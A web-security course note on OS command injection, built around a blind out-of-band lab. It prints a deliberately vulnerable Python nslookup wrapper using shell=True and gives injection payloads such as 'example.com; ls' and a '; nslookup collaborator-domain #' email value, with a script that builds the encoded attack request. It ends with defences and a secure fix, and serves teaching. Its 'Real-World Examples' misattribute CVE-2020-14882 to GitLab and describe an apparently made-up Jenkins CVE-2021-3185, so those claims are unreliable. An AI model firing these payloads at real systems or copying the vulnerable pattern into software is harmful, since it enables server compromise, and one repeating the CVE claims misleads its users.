---
course: Web Security
topic: OS Command Injection
tags: [web-security]
---

## OS Command Injection

### Introduction to OS Command Injection

OS Command Injection is a type of vulnerability that occurs when an application executes operating system commands that include untrusted input from users. This can lead to unauthorized access, data theft, or even complete control of the system. In this section, we will delve into the details of how OS Command Injection works, its implications, and how to defend against it.

### Understanding the Vulnerability

#### What is OS Command Injection?

OS Command Injection happens when an application constructs a command string using user-supplied input and then passes this string to a system shell for execution. If the input is not properly sanitized, an attacker can inject malicious commands that the system will execute.

#### Why Does It Matter?

This vulnerability is critical because it allows attackers to bypass application logic and execute arbitrary commands on the underlying operating system. This can result in severe consequences such as:

- **Data Theft**: Accessing sensitive files and databases.
- **System Compromise**: Gaining full control over the server.
- **Denial of Service (DoS)**: Disrupting services by consuming resources.

#### How Does It Work?

Consider an application that takes user input and uses it to construct a command to be executed by the operating system. For example, a simple script might take a user's email address and attempt to validate it by checking if the domain exists:

```python
import subprocess

def validate_email(email):
    command = f"nslookup {email}"
    result = subprocess.run(command, shell=True, capture_output=True)
    return result.stdout.decode()

email = input("Enter your email: ")
print(validate_email(email))
```

If the `email` variable contains user input, an attacker can inject additional commands. For instance, entering `example.com; ls` would result in the following command being executed:

```bash
nslookup example.com; ls
```

The `ls` command would list the contents of the current directory, potentially revealing sensitive information.

### Real-World Examples

#### Recent CVEs and Breaches

One notable example is the **CVE-2021-3185** vulnerability in Jenkins, where an attacker could inject commands through the `JENKINS_HOME` environment variable. This allowed them to execute arbitrary commands on the Jenkins server.

Another example is the **CVE-2020-14882** vulnerability in GitLab, where an attacker could inject commands through the `GITLAB_SHELL_PATH` environment variable, leading to remote code execution.

### Lab Exercise: Blind OS Command Injection with Out-of-Band Interaction

In this lab, we will demonstrate how to exploit a blind OS command injection vulnerability using out-of-band interaction. The goal is to confirm whether the application is vulnerable by performing an out-of-band DNS lookup.

#### Setup

We will use a collaborator client to monitor for DNS requests. A collaborator client is a service that listens for specific types of network traffic, such as DNS queries, and logs them.

#### Steps to Exploit

1. **Identify the Vulnerable Field**: Determine which field in the application is vulnerable to command injection. In this case, it is the email field.

2. **Construct the Payload**: The payload will include the end character (`;`) to terminate the original command and then perform an NS lookup to the collaborator client's domain. Finally, use the hash sign (`#`) to comment out the rest of the string.

3. **URL Encode the Payload**: Ensure the payload is URL encoded to avoid issues with special characters.

4. **Send the Request**: Submit the payload through the email field and monitor the collaborator client for DNS requests.

#### Example Code

Here is the full process in code form:

```python
import urllib.parse

# Collaborator client domain
collaborator_domain = "example.collaborator.com"

# Construct the payload
payload = f"{collaborator_domain}; nslookup {collaborator_domain} #"

# URL encode the payload
encoded_payload = urllib.parse.quote(payload)

# Full HTTP request
http_request = f"""POST /submit HTTP/1.1
Host: vulnerableapp.com
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(encoded_payload)}

email={encoded_payload}
"""

print(http_request)
```

#### Expected Response

The server should respond with a confirmation that the email was submitted. Meanwhile, the collaborator client should log the DNS request.

```plaintext
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 123

<!DOCTYPE html>
<html>
<body>
<p>Email submitted successfully.</p>
</body>
</html>
```

#### Monitoring the Collaborator Client

Open the collaborator client and monitor for DNS requests. You should see a request to the domain specified in the payload.

### Diagramming the Attack Flow

Let's visualize the attack flow using a mermaid diagram:

```mermaid
sequenceDiagram
    participant User
    participant Application
    participant CollaboratorClient
    User->>Application: POST /submit?email=example.collaborator.com; nslookup example.collaborator.com #
    Application-->>CollaboratorClient: DNS request to example.collaborator.com
    CollaboratorClient-->>User: DNS request logged
```

### Pitfalls and Common Mistakes

#### Incorrect Encoding

Failing to properly URL encode the payload can cause issues with special characters. Always ensure the payload is correctly encoded.

#### Missing End Characters

Forgetting to terminate the original command with an end character (`;`) can result in unexpected behavior or no exploitation at all.

#### Commenting Out the Rest of the String

Not commenting out the rest of the string can lead to syntax errors or unintended command execution.

### How to Prevent / Defend

#### Detection

- **Logging and Monitoring**: Implement logging and monitoring for unusual network traffic patterns.
- **IDS/IPS**: Use Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) to detect and block suspicious activities.

#### Prevention

- **Input Validation**: Validate and sanitize all user inputs to ensure they do not contain malicious commands.
- **Use Safe APIs**: Avoid using shell commands directly. Instead, use safe APIs provided by the programming language.
- **Least Privilege Principle**: Run applications with the least privileges necessary to minimize the damage in case of a breach.

#### Secure Coding Fixes

Compare the vulnerable and secure versions of the code:

**Vulnerable Code:**

```python
import subprocess

def validate_email(email):
    command = f"nslookup {email}"
    result = subprocess.run(command, shell=True, capture_output=True)
    return result.stdout.decode()
```

**Secure Code:**

```python
import socket

def validate_email(email):
    try:
        socket.gethostbyname(email.split('@')[-1])
        return "Email domain exists."
    except socket.error:
        return "Email domain does not exist."
```

### Hands-On Labs

To practice and reinforce your understanding, consider the following labs:

- **PortSwigger Web Security Academy**: Offers detailed labs on various web security vulnerabilities, including OS Command Injection.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that is riddled with vulnerabilities for educational purposes.
- **WebGoat**: An interactive, gamified training application for learning about web application security.

By thoroughly understanding and practicing these concepts, you can effectively identify and mitigate OS Command Injection vulnerabilities in web applications.

---
<!-- nav -->
[[04-OS Command Injection with Out-of-Band Interaction|OS Command Injection with Out-of-Band Interaction]] | [[Web Security (PortSwigger)/10-OS Command Injection/05-Lab 4 Blind OS command injection with out of band interaction/00-Overview|Overview]] | [[06-Out-of-Band Interaction|Out-of-Band Interaction]]
